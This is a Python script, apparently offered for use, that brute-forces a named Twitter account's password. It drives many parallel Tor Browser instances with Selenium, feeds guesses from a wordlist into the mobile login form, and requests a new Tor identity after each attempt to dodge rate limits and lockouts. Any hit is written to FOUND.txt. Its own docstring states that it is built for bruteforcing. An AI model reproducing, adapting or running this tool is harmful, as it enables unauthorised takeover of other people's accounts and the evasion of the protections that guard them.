import argparse
import multiprocessing
import os
import tempfile
from asyncio import sleep
from os.path import join

from pyvirtualdisplay import Display
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.utils import free_port
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
import tbselenium.common as cm
from stem import Signal
from stem.control import Controller
from tbselenium.tbdriver import TorBrowserDriver
from tbselenium.utils import launch_tbb_tor_with_stem

# global state
RUNNING = False

# thread synced queue to get a password to try
PASSWORDS = multiprocessing.Queue()

# colors
W = '\033[0m'
R = '\033[31m'
G = '\033[32m'
O = '\033[33m'


class TorExecutorSettings:
    """
    Settings for your Tor executor
    """

    def __init__(self,
                 # how many tor instances you want to run
                 jobs_in_parallel=15,
                 # if you want to switch identity after every attempt
                 switch_identity=True,
                 switch_identity_sleep=2,
                 # path to tor browser binaries
                 tor_dir="tor-browser_en-US",
                 # headless will run browser in virtual screen
                 # so you dont need to see it
                 headless=True
                 ):
        self.jobs_in_parallel = jobs_in_parallel
        self.switch_identity = switch_identity
        self.tor_dir = tor_dir
        self.headless = headless
        self.switch_identity_sleep = switch_identity_sleep
        self.executor = None


class TorExecutor:
    """
    Executes a job with tor selenium driver parallel
    and renews your identity every time the job is executed.

    Yes, it's for bruteforcing, bitch.
    """

    def __init__(self, executor, tor_executor_settings=TorExecutorSettings()):
        self.settings = tor_executor_settings
        self.settings.executor = executor
        self.executor = executor

    def start(self):
        global RUNNING
        RUNNING = True
        # pool of tor browsers (size: jobs_in_parallel)
        pool = multiprocessing.Pool(self.settings.jobs_in_parallel)
        pool.map(launch_tor, self.settings.jobs_in_parallel * [self.settings]),

    @staticmethod
    def stop():
        global RUNNING
        RUNNING = False
        exit(0)


def launch_tor(settings):
    # executor is the function to call with the driver
    # to run your stuff
    executor = settings.executor
    global RUNNING
    # get some free ports e.g for control of the browser
    socks_port = free_port()
    control_port = free_port()
    tor_data_dir = tempfile.mkdtemp()
    tor_binary = join(settings.tor_dir, cm.DEFAULT_TOR_BINARY_PATH)
    display = Display(visible=0, size=(1920, 1080))
    if settings.headless:
        # start virtual display to hide visual output
        display.start()
    torrc = {'ControlPort': str(control_port),
             'SOCKSPort': str(socks_port),
             'DataDirectory': tor_data_dir}
    # launch a tor browser with given ports and settings
    tor_proccess = launch_tbb_tor_with_stem(tbb_path=settings.tor_dir, torrc=torrc, tor_binary=tor_binary)
    with Controller.from_port(port=control_port) as controller:
        # authenticate controller to switch identity later
        controller.authenticate()
        with TorBrowserDriver(settings.tor_dir, socks_port=socks_port,
                              control_port=control_port,
                              tor_cfg=cm.USE_STEM) as driver:
            print(G + ("   TOR STARTED \t| SOCKSPort: {} \t| ControlPort: {}".format(str(socks_port),
                                                                                     str(control_port))) + W)
            # use driver of this tor to run the job as long as it's running
            while RUNNING:
                # execute code to bruteforce
                executor(driver)
                if settings.switch_identity:
                    # send signal to renew the identity to tor browser
                    controller.authenticate()
                    controller.signal(Signal.NEWNYM)
                    sleep(settings.switch_identity_sleep)
            # when no longer running kill all things such as virtual display, browser driver and tor
            driver.quit()
            display.stop()
            tor_proccess.kill()


def load_wlist(wlist):
    # open pass word list
    if not os.path.isfile(wlist):
        print(R + ("   WLIST NOT FOUND") + W)
        exit(0)
    with open(wlist) as words:
        # read all lines (== passwords)
        lines = words.readlines()
        for word in lines:
            # queue passwords
            PASSWORDS.put(word.strip("\n"))
    print(G + ("   WLIST PARSED \t| Size: {}".format(str(PASSWORDS.qsize()))) + W)

    # noinspection PyBroadException


def bruteforce(driver):
    """
    basic logic to log in to twitter using selenium
    has exactly one argument driver
    """
    password = PASSWORDS.get()  # get new password from synced queue
    driver.get("https://mobile.twitter.com/session/new")  # load twitter login page in browser
    try:
        # confirm to continue with js disabled (if neccessaray)
        confirm = WebDriverWait(driver, 1).until(
            ec.presence_of_element_located((By.XPATH, "/html/body/span/form/div/p[2]/button")))
        confirm.click()
    except Exception:
        # ignore if confirmation is not needed
        pass

    # wait until username input field is located
    WebDriverWait(driver, 30).until(
        ec.presence_of_element_located((By.NAME, "session[username_or_email]")))

    # select input field
    twit_user = driver.find_element_by_name("session[username_or_email]")

    # clear field
    twit_user.clear()

    # insert username (const)
    twit_user.send_keys(USERNAME)

    # select password field
    twit_pw = driver.find_element_by_name("session[password]")

    # clear password field
    twit_pw.clear()
    # inser given password from list
    twit_pw.send_keys(password)
    # hit return to try login
    twit_pw.send_keys(Keys.RETURN)
    # wait for result (just to be sure)

    # get current url
    url = driver.current_url

    # if it fails you land on /session/new or /login/check
    if "https://mobile.twitter.com/session/new" not in url \
            and "https://mobile.twitter.com/login/check" not in url:
        # if thats not the case we found the password!
        print(G + ("    Username: {} \t| Password found: {} \n".format(USERNAME, password)) + W)

        # be sure to let you know what you found
        with open("FOUND.txt", "w") as file:
            file.write(("SUCCESS | Username: {} \t| Password: {} \n".format(USERNAME, password)))

        # stop all running proccesses
        tor_executor.stop()
    #  if not found it continues to get current ip address used
    driver.get("http://ip.42.pl/raw")
    WebDriverWait(driver, 30).until(
        ec.presence_of_element_located((By.TAG_NAME, "body")))
    # log the failure with username, password and ip
    print(O + ("   FAILED \t| Username: {} \t|  IP: {} \t| Password: {} "
               .format(USERNAME,
                       driver.find_element_by_tag_name("body").text, password) + W))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Bruteforce twitter account')
    parser.add_argument('username', type=str,
                        help='enter username to attack')
    parser.add_argument('wlist', type=str,
                        help='enter path to wlist / password list')
    parser.add_argument('tor', type=str,
                        help='provide path to tor binaries')
    parser.add_argument('-instances', type=int,
                        help='amount of tor instances running in parallel')

    args = parser.parse_args()
    # load all words from password list
    load_wlist(args.wlist)

    # set username
    USERNAME = args.username

    tor_exec_settings = TorExecutorSettings(tor_dir=args.tor) if not args.instances else TorExecutorSettings(
        tor_dir=args.tor,
        jobs_in_parallel=args.instances)
    # executor is a multithreading, identity switching service
    tor_executor = TorExecutor(bruteforce, tor_exec_settings)
    # start tor executor
    tor_executor.start()
